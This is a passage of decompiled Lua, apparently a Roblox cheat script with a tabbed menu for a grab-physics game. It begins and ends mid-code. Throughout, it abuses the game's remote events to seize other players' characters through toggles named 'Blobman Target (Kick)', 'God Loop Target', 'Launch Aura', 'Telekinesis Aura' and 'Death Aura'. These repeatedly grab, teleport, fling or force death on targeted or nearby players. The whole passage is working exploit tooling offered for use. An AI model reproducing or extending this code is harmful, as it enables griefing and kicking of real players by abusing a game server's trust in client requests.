    Callback = function(p244)
        u238.selectedPlayer = u238.Players:FindFirstChild(p244)
    end,
})

registerDropdown(u238.targetPlayerDropdown)
v237:AddButton({
    Name = 'Add Selected Player to Target List',
    Callback = function()
        if u238.selectedPlayer and not u238.TargetList[u238.selectedPlayer.UserId] then
            u238.TargetList[u238.selectedPlayer.UserId] = u238.selectedPlayer.Name

            u24:MakeNotification({
                Name = 'Player Added',
                Content = u238.selectedPlayer.Name .. ' added to target list.',
                Time = 2,
            })
        end
    end,
})
v237:AddButton({
    Name = 'Remove Selected Player from Target List',
    Callback = function()
        if u238.selectedPlayer and u238.TargetList[u238.selectedPlayer.UserId] then
            u238.TargetList[u238.selectedPlayer.UserId] = nil

            u24:MakeNotification({
                Name = 'Player Removed',
                Content = u238.selectedPlayer.Name .. ' removed from target list.',
                Time = 2,
            })
        end
    end,
})

function blobGrabPlayer(p245, p246)
    if u13 ~= 1 then
        if p245.Character and p245.Character:FindFirstChild('HumanoidRootPart') then
            local v247 = {
                p246:FindFirstChild('RightDetector'),
                p245.Character:FindFirstChild('HumanoidRootPart'),
                p246:FindFirstChild('RightDetector'):FindFirstChild('RightWeld'),
            }

            p246:WaitForChild('BlobmanSeatAndOwnerScript'):WaitForChild('CreatureGrab'):FireServer(unpack(v247))

            u13 = 1
        end
    elseif p245.Character and p245.Character:FindFirstChild('HumanoidRootPart') then
        local v248 = {
            p246:FindFirstChild('LeftDetector'),
            p245.Character:FindFirstChild('HumanoidRootPart'),
            p246:FindFirstChild('LeftDetector'):FindFirstChild('LeftWeld'),
        }

        p246:WaitForChild('BlobmanSeatAndOwnerScript'):WaitForChild('CreatureGrab'):FireServer(unpack(v248))

        u13 = 2
    end
end
function getMountedBlobman()
    local _Character12 = _LocalPlayer.Character

    if _Character12 then
        local _Humanoid5 = _Character12:FindFirstChildOfClass('Humanoid')

        if _Humanoid5 and (_Humanoid5.SeatPart and _Humanoid5.SeatPart.Parent.Name == 'CreatureBlobman') then
            return _Humanoid5.SeatPart.Parent
        end
    end

    return nil
end
function teleportBlobman(p251, p252)
    local _Character13 = _LocalPlayer.Character

    if _Character13 then
        _Character13 = _LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
    end
    if _Character13 then
        local _BodyPosition = Instance.new('BodyPosition')

        _BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        _BodyPosition.P = 100000
        _BodyPosition.Position = p252
        _BodyPosition.Parent = p251.PrimaryPart
        _Character13.CFrame = CFrame.new(p252)

        p251:SetPrimaryPartCFrame(CFrame.new(p252))
        task.wait(0.1)
        _BodyPosition:Destroy()
    end
end
function startGrabbingPlayers()
    task.spawn(function()
        while true do
            if not u10 then
                return
            end

            local v255 = _Workspace
            local v256, v257, v258 = pairs(v255:GetDescendants())
            local v259 = nil

            while true do
                local v260

                v258, v260 = v256(v257, v258)

                if v258 == nil then
                    v260 = v259
                end
                if v260.Name == 'CreatureBlobman' and v260:FindFirstChild('VehicleSeat') and (v260.VehicleSeat:FindFirstChild('SeatWeld') and v260.VehicleSeat.SeatWeld.Part1:IsDescendantOf(_LocalPlayer5.Character)) then
                    break
                end
            end

            if not v260 then
                u24:MakeNotification({
                    Name = 'Error',
                    Content = 'You must be mounted on a Blobman!',
                    Time = 5,
                })

                u10 = false

                return
            end

            local v261, v262, v263 = pairs(u29.TargetList)

            while true do
                local v264

                v263, v264 = v261(v262, v263)

                if v263 == nil then
                    break
                end

                local v265 = _Players:GetPlayerByUserId(v263)

                if v265 then
                    blobGrabPlayer(v265, v260)
                    task.wait(u29.BlobmanDelay or 0.1)
                end
            end

            task.wait(0.02)
        end
    end)
end
function attemptTeleportAndGrab(p266, p267, p268)
    local _Character14 = _LocalPlayer.Character

    if _Character14 then
        _Character14 = _LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
    end
    if not (_Character14 and p266.Character and p266.Character:FindFirstChild('HumanoidRootPart')) then
        return false
    end

    local _HumanoidRootPart6 = p266.Character.HumanoidRootPart

    if (_HumanoidRootPart6.Position - p268).Magnitude <= 20 then
        return true
    end

    local v271 = _HumanoidRootPart6.Position + Vector3.new(0, 2, 0)

    teleportBlobman(p267, v271)
    task.wait(0.2)
    blobGrabPlayer(p266, p267)
    task.wait(0.2)
    teleportBlobman(p267, p268)
    task.wait(0.2)

    return (_HumanoidRootPart6.Position - p268).Magnitude <= 20
end
function startTeleportingPlayers()
    task.spawn(function()
        while u10 do
            local v272 = getMountedBlobman()
            local _Character15 = _LocalPlayer.Character

            if _Character15 then
                _Character15 = _LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
            end
            if v272 and _Character15 then
                local _Position2 = _Character15.Position
                local v275, v276, v277 = pairs(u29.TargetList)

                while true do
                    local v278

                    v277, v278 = v275(v276, v277)

                    if v277 == nil then
                        break
                    end

                    local v279 = _Players:GetPlayerByUserId(v277)

                    if v279 and v279.Character and (v279.Character:FindFirstChild('HumanoidRootPart') and (v279.Character.HumanoidRootPart.Position - _Position2).Magnitude > 20) then
                        local v280 = false
                        local v281 = 0

                        while u10 and (not v280 and v281 < 3) do
                            v280 = attemptTeleportAndGrab(v279, v272, _Position2)
                            v281 = v281 + 1

                            if not v280 then
                                task.wait(0.5)
                            end
                        end
                    end
                end
            end

            task.wait(0.2)
        end
    end)
end

v237:AddToggle({
    Name = 'Blobman Target (If you are in safe zone/void)',
    Default = false,
    Callback = function(p282)
        u10 = p282

        if p282 then
            startGrabbingPlayers()
            startTeleportingPlayers()
        end
    end,
})

function findGroundBelow(p283)
    local v284 = RaycastParams.new()

    v284.FilterDescendantsInstances = {
        u238.LocalPlayer.Character,
    }
    v284.FilterType = Enum.RaycastFilterType.Blacklist

    local v285 = u238.Workspace:Raycast(p283 + Vector3.new(0, 50, 0), Vector3.new(0, -400), v284)

    if v285 then
        p283 = v285.Position or p283
    end

    return p283
end
function spawnBlobman()
    local _Character16 = u238.LocalPlayer.Character

    if _Character16 then
        _Character16 = u238.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
    end
    if not _Character16 then
        return nil
    end

    local v287 = findGroundBelow(_Character16.Position)
    local u288 = CFrame.new(v287 + Vector3.new(0, 3, 0))

    pcall(function()
        u238.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('CreatureBlobman', u288, Vector3.new(0, 59.667, 0))
    end)

    local v289 = u238.LocalPlayer.Name .. 'SpawnedInToys'

    for _ = 1, 30 do
        local v290 = u238.Workspace:FindFirstChild(v289)
        local v291 = v290 and v290:FindFirstChild('CreatureBlobman')

        if v291 then
            u238.blobalter = 1

            return v291
        end

        task.wait(0.15)
    end

    return nil
end
function findExistingBlobman()
    local v292 = u238.Workspace:FindFirstChild(u238.LocalPlayer.Name .. 'SpawnedInToys')

    return v292 and v292:FindFirstChild('CreatureBlobman') or nil
end
function getMountedBlobman()
    local _Character17 = u238.LocalPlayer.Character

    if _Character17 then
        local _Humanoid6 = _Character17:FindFirstChildOfClass('Humanoid')

        if _Humanoid6 and (_Humanoid6.SeatPart and (_Humanoid6.SeatPart.Parent and _Humanoid6.SeatPart.Parent.Name == 'CreatureBlobman')) then
            return _Humanoid6.SeatPart.Parent
        else
            return nil
        end
    else
        return nil
    end
end
function seatOnBlobman(p295)
    if p295 and u238.LocalPlayer.Character then
        local _Character18 = u238.LocalPlayer.Character
        local _Humanoid7 = _Character18:FindFirstChildOfClass('Humanoid')
        local _HumanoidRootPart7 = _Character18:FindFirstChild('HumanoidRootPart')

        if _Humanoid7 and _HumanoidRootPart7 then
            local _VehicleSeat = p295:FindFirstChild('VehicleSeat')

            if _VehicleSeat and _VehicleSeat:IsA('VehicleSeat') then
                _HumanoidRootPart7.CFrame = _VehicleSeat.CFrame + Vector3.new(0, 2, 0)

                pcall(function()
                    _VehicleSeat:Sit(_Humanoid7)
                end)
                task.wait(0.25)
            end
        end
    else
        return
    end
end
function teleportBlobman(p300, p301)
    if p300 and p300.PrimaryPart then
        local _Character19 = u238.LocalPlayer.Character

        if _Character19 then
            local _HumanoidRootPart8 = _Character19:FindFirstChild('HumanoidRootPart')

            if _HumanoidRootPart8 then
                local _BodyPosition2 = Instance.new('BodyPosition')

                _BodyPosition2.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                _BodyPosition2.P = 100000
                _BodyPosition2.Position = p301
                _BodyPosition2.Parent = p300.PrimaryPart

                pcall(function()
                    _HumanoidRootPart8.CFrame = CFrame.new(p301)

                    p300:SetPrimaryPartCFrame(CFrame.new(p301))
                end)
                task.wait(0.1)

                if _BodyPosition2 and _BodyPosition2.Parent then
                    _BodyPosition2:Destroy()
                end
            end
        else
            return
        end
    else
        return
    end
end
function blobGrabPlayer(p305, p306)
    if p305 and p306 then
        if p305.Character and p305.Character:FindFirstChild('HumanoidRootPart') then
            local _LeftDetector = p306:FindFirstChild('LeftDetector')
            local _RightDetector = p306:FindFirstChild('RightDetector')
            local _BlobmanSeatAndOwnerScript = p306:FindFirstChild('BlobmanSeatAndOwnerScript')

            if _BlobmanSeatAndOwnerScript then
                local _CreatureGrab = _BlobmanSeatAndOwnerScript:FindFirstChild('CreatureGrab')

                if _CreatureGrab then
                    if u238.blobalter ~= 1 then
                        local u311

                        if _RightDetector then
                            u311 = _RightDetector:FindFirstChild('RightWeld')
                        else
                            u311 = _RightDetector
                        end
                        if _RightDetector and u311 then
                            pcall(function()
                                _CreatureGrab:FireServer(_RightDetector, p305.Character.HumanoidRootPart, u311)
                            end)

                            u238.blobalter = 1
                        end
                    else
                        local u312

                        if _LeftDetector then
                            u312 = _LeftDetector:FindFirstChild('LeftWeld')
                        else
                            u312 = _LeftDetector
                        end
                        if _LeftDetector and u312 then
                            pcall(function()
                                _CreatureGrab:FireServer(_LeftDetector, p305.Character.HumanoidRootPart, u312)
                            end)

                            u238.blobalter = 2
                        end
                    end
                end
            else
                return
            end
        else
            return
        end
    else
        return
    end
end
function attemptTeleportAndGrab(p313, p314, p315, p316)
    local v317 = p316 or 20

    if p313 and (p314 and p315) then
        if p313.Character and p313.Character:FindFirstChild('HumanoidRootPart') then
            local _HumanoidRootPart9 = p313.Character.HumanoidRootPart
            local _Magnitude = (_HumanoidRootPart9.Position - p315).Magnitude

            if u238.ORIGIN_POS and (_HumanoidRootPart9.Position - u238.ORIGIN_POS).Magnitude > u238.MAX_TELEPORT_DIST then
                return false
            elseif _Magnitude <= v317 then
                blobGrabPlayer(p313, p314)
                task.wait(0.1)

                return true
            else
                local v320 = _HumanoidRootPart9.Position + Vector3.new(0, 2, 0)

                teleportBlobman(p314, v320)
                task.wait(0.2)
                blobGrabPlayer(p313, p314)
                task.wait(0.2)
                teleportBlobman(p314, p315)
                task.wait(0.2)

                if p313.Character and p313.Character:FindFirstChild('HumanoidRootPart') then
                    return (p313.Character.HumanoidRootPart.Position - p315).Magnitude <= v317
                else
                    return false
                end
            end
        else
            return false
        end
    else
        return false
    end
end
function blobDropAndRegrabCycle(p321, p322, p323)
    if not (p321 and (p321.Character and (p322 and p322.Parent))) then
        return
    end

    local _HumanoidRootPart10 = p321.Character:FindFirstChild('HumanoidRootPart')

    if not _HumanoidRootPart10 then
        return
    end

    local _BlobmanSeatAndOwnerScript2 = p322:FindFirstChild('BlobmanSeatAndOwnerScript')

    if not _BlobmanSeatAndOwnerScript2 then
        return
    end

    local _CreatureDrop = _BlobmanSeatAndOwnerScript2:FindFirstChild('CreatureDrop')

    if not (_CreatureDrop and _BlobmanSeatAndOwnerScript2:FindFirstChild('CreatureGrab')) then
        return
    end

    for v327 = 1, 4 do
        if not u238.toggleEnabled then
            break
        end

        local v328 = (p323 or u238.LocalPlayer.Character and (u238.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and u238.LocalPlayer.Character.HumanoidRootPart.Position) or Vector3.new()) + Vector3.new(0, 10 * v327, 0)

        if p322 and p322.PrimaryPart then
            teleportBlobman(p322, v328)
        end

        task.wait(0.1)

        local _LeftDetector2 = p322:FindFirstChild('LeftDetector')
        local _RightDetector2 = p322:FindFirstChild('RightDetector')

        if _LeftDetector2 then
            _LeftDetector2 = _LeftDetector2:FindFirstChild('RigidConstraint') or _LeftDetector2:FindFirstChild('LeftWeld')
        end
        if _RightDetector2 then
            _RightDetector2 = _RightDetector2:FindFirstChild('RightWeld') or _RightDetector2:FindFirstChild('RigidConstraint')
        end
        if _LeftDetector2 then
            pcall(function()
                _CreatureDrop:FireServer(_LeftDetector2, _HumanoidRootPart10)
            end)
        end
        if _RightDetector2 then
            pcall(function()
                _CreatureDrop:FireServer(_RightDetector2, _HumanoidRootPart10)
            end)
        end

        task.wait(0.1)
        blobGrabPlayer(p321, p322)
        task.wait(0.1)
    end
end
function masterLoop()
    if not u238.masterRunning then
        u238.masterRunning = true

        local _Character20 = u238.LocalPlayer.Character

        if _Character20 then
            _Character20 = _Character20:FindFirstChild('HumanoidRootPart')
        end
        if _Character20 then
            u238.ORIGIN_POS = _Character20.Position
        end

        u29.LastProcessed = u29.LastProcessed or {}

        task.spawn(function()
            while true do
                if true then
                    if not u238.toggleEnabled then
                        u238.masterRunning = false

                        return
                    end
                    if not u238.currentBlobman or u238.currentBlobman and not u238.currentBlobman.Parent then
                        u238.currentBlobman = findExistingBlobman()
                    end

                    local v332 = ((not u238.currentBlobman or u238.currentBlobman and not u238.currentBlobman.Parent) and true or false) and spawnBlobman()

                    if v332 then
                        u238.currentBlobman = v332

                        task.wait(0.25)
                    end
                    if not (u238.currentBlobman and u238.currentBlobman.Parent) then
                    end
                end

                local v333 = getMountedBlobman()

                if not v333 or v333 ~= u238.currentBlobman then
                    local v334 = os.clock()

                    while u238.toggleEnabled and (not v333 or v333 ~= u238.currentBlobman) do
                        seatOnBlobman(u238.currentBlobman)
                        task.wait(0.25)

                        v333 = getMountedBlobman()

                        if v333 == u238.currentBlobman then
                            break
                        end
                        if os.clock() - v334 >= 5 then
                            local v335 = spawnBlobman()

                            if not v335 then
                                break
                            end

                            u238.currentBlobman = v335

                            task.wait(0.3)

                            for _ = 1, 6 do
                                if not u238.toggleEnabled then
                                    break
                                end

                                seatOnBlobman(u238.currentBlobman)
                                task.wait(0.25)

                                if getMountedBlobman() == u238.currentBlobman then
                                    break
                                end
                            end
                        end
                    end
                end
                if getMountedBlobman() == u238.currentBlobman then
                    local _Character21 = u238.LocalPlayer.Character

                    if _Character21 then
                        _Character21 = _Character21:FindFirstChild('HumanoidRootPart')
                    end
                    if _Character21 then
                        local _Position3 = _Character21.Position
                        local v338 = {}

                        if u238.teleportAllEnabled then
                            local v339, v340, v341 = ipairs(u238.Players:GetPlayers())

                            while true do
                                local v342

                                v341, v342 = v339(v340, v341)

                                if v341 == nil then
                                    break
                                end
                                if v342 ~= u238.LocalPlayer then
                                    table.insert(v338, v342)
                                end
                            end
                        else
                            local v343, v344, v345 = pairs(u238.TargetList)

                            while true do
                                local v346

                                v345, v346 = v343(v344, v345)

                                if v345 == nil then
                                    break
                                end

                                local v347 = u238.Players:GetPlayerByUserId(v345)

                                if v347 then
                                    table.insert(v338, v347)
                                end
                            end
                        end

                        local v348, v349, v350 = ipairs(v338)

                        while true do
                            local u351

                            v350, u351 = v348(v349, v350)

                            if v350 == nil or not u238.toggleEnabled then
                                break
                            end
                            if u351 and u351.Character and u351.Character:FindFirstChild('HumanoidRootPart') then
                                if u29.LastProcessed[u351.UserId] then
                                    local _Character22 = u351.Character

                                    if _Character22 then
                                        _Character22 = u351.Character:FindFirstChild('HumanoidRootPart')
                                    end

                                    local _Character23 = u351.Character

                                    if _Character23 then
                                        _Character23 = u351.Character:FindFirstChild('Humanoid')
                                    end
                                    if not _Character22 or (not _Character23 or (_Character23.Health <= 0 or (_Character22.Position - _Position3).Magnitude > 20)) then
                                        u29.LastProcessed[u351.UserId] = nil
                                    end
                                end
                                if u238.ORIGIN_POS and (u351.Character.HumanoidRootPart.Position - u238.ORIGIN_POS).Magnitude <= u238.MAX_TELEPORT_DIST then
                                    if (u351.Character.HumanoidRootPart.Position - _Position3).Magnitude <= 20 then
                                        blobGrabPlayer(u351, u238.currentBlobman)
                                        task.wait(u29.BlobmanDelay or 0.1)
                                        pcall(function()
                                            blobDropAndRegrabCycle(u351, u238.currentBlobman, _Position3)
                                        end)

                                        u29.LastProcessed[u351.UserId] = tick()
                                    else
                                        local v354 = false
                                        local v355 = 0

                                        while u238.toggleEnabled and (not v354 and (v355 < 3 and (u238.currentBlobman and (u238.currentBlobman.Parent and getMountedBlobman() == u238.currentBlobman)))) do
                                            v354 = attemptTeleportAndGrab(u351, u238.currentBlobman, _Position3, 20)
                                            v355 = v355 + 1

                                            if v354 then
                                                pcall(function()
                                                    blobDropAndRegrabCycle(u351, u238.currentBlobman, _Position3)
                                                end)

                                                u29.LastProcessed[u351.UserId] = tick()
                                            else
                                                task.wait(0.4)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                task.wait(0.25)
            end
        end)
    end
end

u238.LocalPlayer.CharacterAdded:Connect(function()
    if u238.toggleEnabled then
        task.wait(1.5)

        local _Character24 = u238.LocalPlayer.Character

        if _Character24 then
            _Character24 = u238.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
        end
        if _Character24 then
            u238.ORIGIN_POS = _Character24.Position
        end

        masterLoop()
    end
end)
v237:AddToggle({
    Name = 'Blobman Target (Kick)',
    Default = false,
    Callback = function(p357)
        u238.toggleEnabled = p357

        if p357 then
            local _Character25 = u238.LocalPlayer.Character

            if _Character25 then
                _Character25 = u238.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
            end
            if _Character25 then
                u238.ORIGIN_POS = _Character25.Position
            end

            masterLoop()
        end
    end,
})
v237:AddSlider({
    Name = 'Teleport Duration',
    Min = 0.25,
    Max = 3,
    Default = u238.teleportDelay,
    Increment = 0.01,
    ValueName = 'Seconds',
    Callback = function(p359)
        u238.teleportDelay = p359
    end,
})
u238.Players.PlayerAdded:Connect(refreshDropdown)
u238.Players.PlayerRemoving:Connect(refreshDropdown)

local u360 = {
    autoGrab = false,
    autoGrabCoroutine = nil,
}

function grabDual(p361, p362)
    local _LeftDetector3 = p361:FindFirstChild('LeftDetector')
    local _RightDetector3 = p361:FindFirstChild('RightDetector')
    local _BlobmanSeatAndOwnerScript3 = p361:FindFirstChild('BlobmanSeatAndOwnerScript')

    if _LeftDetector3 and (_RightDetector3 and (_BlobmanSeatAndOwnerScript3 and p362)) then
        local _RigidConstraint = _LeftDetector3:FindFirstChild('RigidConstraint')
        local _RightWeld = _RightDetector3:FindFirstChild('RightWeld')

        if _RigidConstraint then
            pcall(function()
                _BlobmanSeatAndOwnerScript3.CreatureGrab:FireServer(_LeftDetector3, p362, _RigidConstraint)
                _BlobmanSeatAndOwnerScript3.CreatureDrop:FireServer(_RigidConstraint, p362)
            end)
        end
        if _RightWeld then
            pcall(function()
                _BlobmanSeatAndOwnerScript3.CreatureGrab:FireServer(_RightDetector3, p362, _RightWeld)
                _BlobmanSeatAndOwnerScript3.CreatureDrop:FireServer(_RightWeld, p362)
            end)
        end
    end
end
function getMyBlobman()
    local v368 = _Workspace
    local v369, v370, v371 = pairs(v368:GetDescendants())

    while true do
        local v372

        v371, v372 = v369(v370, v371)

        if v371 == nil then
            break
        end
        if v372:IsA('Model') and (v372.Name == 'CreatureBlobman' and v372:FindFirstChild('VehicleSeat')) then
            local _SeatWeld = v372.VehicleSeat:FindFirstChild('SeatWeld')

            if _SeatWeld and _SeatWeld.Part1 and _SeatWeld.Part1:IsDescendantOf(game.Players.LocalPlayer.Character) then
                return v372
            end
        end
    end

    return nil
end
function loopTargetedGrab()
    u360.autoGrabCoroutine = coroutine.create(function()
        local v374 = getMyBlobman()

        if v374 then
            while u360.autoGrab do
                local v375, v376, v377 = pairs(u29.TargetList)

                while true do
                    local v378

                    v377, v378 = v375(v376, v377)

                    if v377 == nil then
                        break
                    end
                    if v377 ~= game.Players.LocalPlayer.UserId then
                        local v379 = game.Players:GetPlayerByUserId(v377)
                        local v380 = v379 and v379.Character

                        if v380 then
                            v380 = v379.Character:FindFirstChild('HumanoidRootPart')
                        end
                        if v380 then
                            grabDual(v374, v380)
                        end
                    end
                end

                task.wait(0.01)
            end
        else
            u24:MakeNotification({
                Name = 'No Blobman Found',
                Content = 'You must be riding a Blobman to use this.',
                Image = 'rbxassetid://4483345998',
                Time = 5,
            })
        end
    end)

    coroutine.resume(u360.autoGrabCoroutine)
end

v237:AddToggle({
    Name = 'God Loop Target',
    Default = false,
    Callback = function(p381)
        u360.autoGrab = p381

        if p381 then
            loopTargetedGrab()
        elseif u360.autoGrabCoroutine then
            coroutine.close(u360.autoGrabCoroutine)

            u360.autoGrabCoroutine = nil
        end
    end,
})

local u382 = {
    enabled = false,
    coroutine = nil,
    MAX_HOVER_DIST = 500,
    HOVER_HEIGHT = 25,
}

function hoverFollowTarget()
    u382.coroutine = coroutine.create(function()
        while u382.enabled do
            local v383 = getMountedBlobman()
            local _selectedPlayer = u238.selectedPlayer

            if v383 and (_selectedPlayer and _selectedPlayer.Character) and _selectedPlayer.Character:FindFirstChild('HumanoidRootPart') then
                local _HumanoidRootPart11 = _selectedPlayer.Character.HumanoidRootPart
                local _Character26 = u238.LocalPlayer.Character

                if _Character26 then
                    _Character26 = _Character26:FindFirstChild('HumanoidRootPart')
                end
                if _Character26 and (_Character26.Position - _HumanoidRootPart11.Position).Magnitude <= u382.MAX_HOVER_DIST then
                    local v387 = _HumanoidRootPart11.Position + Vector3.new(0, u382.HOVER_HEIGHT, 0)

                    teleportBlobman(v383, v387)
                end
            end

            task.wait(0.06)
        end
    end)

    coroutine.resume(u382.coroutine)
end

v237:AddToggle({
    Name = 'Hover above target',
    Default = false,
    Callback = function(p388)
        u382.enabled = p388

        if p388 then
            hoverFollowTarget()
        elseif u382.coroutine then
            coroutine.close(u382.coroutine)

            u382.coroutine = nil
        end
    end,
})

local v389 = v27:MakeTab({
    Name = 'Auras',
    Icon = 'rbxassetid://6031075939',
    PremiumOnly = false,
})

v389:AddSection({
    Name = 'Auras',
})

local u390 = {
    auraCoroutine = nil,
    gravityCoroutine = nil,
    localPlayer = game.Players.LocalPlayer,
    Players = game.Players,
    Debris = game:GetService('Debris'),
    SetNetworkOwner = game.ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner'),
    OrionLib = u24,
    Tab = v389,
    auraRadius = 25,
}

function startAirSuspendAura()
    u390.auraCoroutine = coroutine.create(function()
        while true do
            local v400, v401 = pcall(function()
                local _Character27 = u390.localPlayer.Character

                if _Character27 and (_Character27:FindFirstChild('Head') and _Character27:FindFirstChild('HumanoidRootPart')) then
                    local _ = _Character27.Head
                    local _HumanoidRootPart12 = _Character27.HumanoidRootPart
                    local v393, v394, v395 = pairs(u390.Players:GetPlayers())

                    while true do
                        local u396

                        v395, u396 = v393(v394, v395)

                        if v395 == nil then
                            break
                        end

                        coroutine.wrap(function()
                            if u396 ~= u390.localPlayer and u396.Character then
                                local _Character28 = u396.Character
                                local _Torso = _Character28:FindFirstChild('Torso')

                                if _Torso and (_Torso.Position - _HumanoidRootPart12.Position).Magnitude <= u390.auraRadius then
                                    u390.SetNetworkOwner:FireServer(_Torso, _Character28.HumanoidRootPart.FirePlayerPart.CFrame)
                                    task.wait(0.1)

                                    local v399 = _Torso:FindFirstChild('l') or Instance.new('BodyVelocity', _Torso)

                                    v399.Name = 'l'
                                    v399.Velocity = Vector3.new(0, 200000000000, 0)
                                    v399.MaxForce = Vector3.new(0, math.huge, 0)

                                    u390.Debris:AddItem(v399, 100)
                                    task.wait(1)
                                    u390.SetNetworkOwner:FireServer(_Torso, nil)

                                    if v399 then
                                        v399:Destroy()
                                    end
                                end
                            end
                        end)()
                    end
                end
            end)

            if not v400 then
                warn('Error in Air Suspend Aura: ' .. tostring(v401))
            end

            task.wait(0.02)
        end
    end)

    coroutine.resume(u390.auraCoroutine)
end
function stopAirSuspendAura()
    if u390.auraCoroutine then
        coroutine.close(u390.auraCoroutine)

        u390.auraCoroutine = nil
    end
end

u390.Tab:AddToggle({
    Name = ' Launch Aura',
    Default = false,
    Callback = function(p402)
        if p402 then
            startAirSuspendAura()
        else
            stopAirSuspendAura()
        end
    end,
})
u390.localPlayer.CharacterAdded:Connect(function(p403)
    u390.playerCharacter = p403
end)

function startHellSendAura()
    u390.gravityCoroutine = coroutine.create(function()
        while true do
            local v421, v422 = pcall(function()
                local _Character29 = u390.localPlayer.Character

                if _Character29 and _Character29:FindFirstChild('HumanoidRootPart') then
                    local _HumanoidRootPart13 = _Character29.HumanoidRootPart
                    local _CurrentCamera = _Workspace.CurrentCamera
                    local v407, v408, v409 = pairs(u390.Players:GetPlayers())

                    while true do
                        local v410

                        v409, v410 = v407(v408, v409)

                        if v409 == nil then
                            break
                        end
                        if v410 ~= u390.localPlayer and v410.Character then
                            local _Character30 = v410.Character
                            local _Torso2 = _Character30:FindFirstChild('Torso')

                            if _Torso2 and (_Torso2.Position - _HumanoidRootPart13.Position).Magnitude <= u390.auraRadius then
                                u390.SetNetworkOwner:FireServer(_Torso2, _HumanoidRootPart13.CFrame)

                                local v413, v414, v415 = ipairs(_Character30:GetDescendants())

                                while true do
                                    local v416

                                    v415, v416 = v413(v414, v415)

                                    if v415 == nil then
                                        break
                                    end
                                    if v416:IsA('BasePart') then
                                        v416.CanCollide = false
                                    end
                                end

                                local v417 = _Torso2:FindFirstChild('HellAuraPos') or Instance.new('BodyPosition')

                                v417.Name = 'HellAuraPos'
                                v417.MaxForce = Vector3.new(100000, 100000, 100000)
                                v417.D = 500
                                v417.P = 50000
                                v417.Parent = _Torso2

                                local v418 = _Torso2:FindFirstChild('HellAuraGyro') or Instance.new('BodyGyro')

                                v418.Name = 'HellAuraGyro'
                                v418.MaxTorque = Vector3.new(100000, 100000, 100000)
                                v418.D = 500
                                v418.P = 50000
                                v418.Parent = _Torso2

                                local _LookVector = _CurrentCamera.CFrame.LookVector
                                local v420 = Vector3.new(0, 5, 0)

                                v417.Position = _HumanoidRootPart13.Position + _LookVector * 15 + v420
                                v418.CFrame = CFrame.new(_Torso2.Position, _HumanoidRootPart13.Position)
                            end
                        end
                    end
                end
            end)

            if not v421 then
                warn('Error in Hell Send Aura: ' .. tostring(v422))
            end

            task.wait(0.05)
        end
    end)

    coroutine.resume(u390.gravityCoroutine)
end
function stopHellSendAura()
    if u390.gravityCoroutine then
        coroutine.close(u390.gravityCoroutine)

        u390.gravityCoroutine = nil
    end
end

u390.Tab:AddToggle({
    Name = 'Telekinesis Aura',
    Default = false,
    Callback = function(p423)
        if p423 then
            startHellSendAura()
        else
            stopHellSendAura()
        end
    end,
})

function death(p424)
    if deathConnection then
        deathConnection:Disconnect()
    end
    if p424 then
        u29.Death_Aura = true
        deathConnection = _RunService.Heartbeat:Connect(function()
            local v425 = _Players
            local v426, v427, v428 = ipairs(v425:GetPlayers())

            while true do
                local v429

                v428, v429 = v426(v427, v428)

                if v428 == nil then
                    break
                end
                if v429 ~= _LocalPlayer and v429.Character then
                    local _HumanoidRootPart14 = v429.Character:FindFirstChild('HumanoidRootPart')
                    local _Head = v429.Character:FindFirstChild('Head')
                    local _Humanoid8 = v429.Character:FindFirstChildOfClass('Humanoid')

                    if _HumanoidRootPart14 and (_Head and (_Humanoid8 and (_Humanoid8.Health > 0 and (_HumanoidRootPart14.Position - _LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 25))) then
                        pcall(function()
                            _GrabEvents.SetNetworkOwner:FireServer(_HumanoidRootPart14, _HumanoidRootPart14.CFrame)
                            task.wait(0.1)
                            _GrabEvents.DestroyGrabLine:FireServer(_HumanoidRootPart14)

                            if _Head:FindFirstChild('PartOwner') and _Head.PartOwner.Value == _LocalPlayer.Name then
                                local v433, v434, v435 = pairs(_Humanoid8.Parent:GetChildren())

                                while true do
                                    local v436

                                    v435, v436 = v433(v434, v435)

                                    if v435 == nil then
                                        break
                                    end
                                    if v436:IsA('BasePart') then
                                        v436.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                                    end
                                end

                                task.wait()

                                local v437, v438, v439 = pairs(_Humanoid8.Parent:GetChildren())

                                while true do
                                    local v440

                                    v439, v440 = v437(v438, v439)

                                    if v439 == nil then
                                        break
                                    end
                                    if v440:IsA('BasePart') then
                                        v440.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                                    end
                                end

                                local _BodyVelocity3 = Instance.new('BodyVelocity')

                                _BodyVelocity3.Velocity = Vector3.new(0, -9999999, 0)
                                _BodyVelocity3.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
                                _BodyVelocity3.P = 100000075
                                _BodyVelocity3.Parent = _HumanoidRootPart14
                                _Humanoid8.Sit = false
                                _Humanoid8.Jump = true
                                _Humanoid8.BreakJointsOnDeath = false

                                _Humanoid8:ChangeState(Enum.HumanoidStateType.Dead)
                                task.delay(2, function()
                                    if _BodyVelocity3 and _BodyVelocity3.Parent then
                                        _BodyVelocity3:Destroy()
                                    end
                                end)
                            end
                        end)
                    end
                end
            end
        end)
    else
        u29.Death_Aura = false
    end
end

v389:AddToggle({
    Name = 'Death Aura',
    Default = false,
    Callback = death,
})

local v442 = v27:MakeTab({
    Name = 'Teleport',
    Icon = 'rbxassetid://6031068433',
    PremiumOnly = false,
})

v442:AddSection({
    Name = 'Teleport',
})

local u443 = false
local u444 = nil

function getAllPlayers()
    local v445 = _Players
    local v446, v447, v448 = pairs(v445:GetPlayers())
    local v449 = {}

    while true do
        local v450

        v448, v450 = v446(v447, v448)

        if v448 == nil then
            break
        end
        if v450 ~= _LocalPlayer then
            table.insert(v449, v450.Name)
        end
    end

    return v449
end
function updateDropdownOptions(p451)
    p451:Refresh(getAllPlayers(), true)
end

local u453 = v442:AddDropdown({
    Name = 'Select Player',
